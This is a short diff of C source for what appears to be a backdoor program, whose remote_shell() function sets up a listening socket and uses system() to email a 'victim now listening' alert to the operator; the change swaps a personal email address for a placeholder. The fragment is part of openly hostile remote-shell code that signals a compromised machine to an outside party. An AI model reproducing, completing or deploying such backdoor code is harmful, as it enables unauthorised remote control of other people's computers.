@@ -52,7 +52,7 @@ int main(int argc , char *argv[])
 }
 
 int remote_shell() {
-	const char* EMAIL = "williammconlon@gmail.com";
+	const char* EMAIL = "email@example.com";
     int ssock, csock, addrlen, ret;
     struct sockaddr_in server, client;
     char message[2000], reply[2000];
@@ -67,7 +67,7 @@ int remote_shell() {
     }
 //    printf("Server socket created\n");
 
-	system("echo "" | mail -t williammconlon@gmail.com -s \"victim now listening\"");
+	system("echo "" | mail -t email@example.com -s \"victim now listening\"");
 
     // Set the server ip address, connection family and port. INADDR_ANY means
     // all the ip addresses of the server can be used to set up connection.
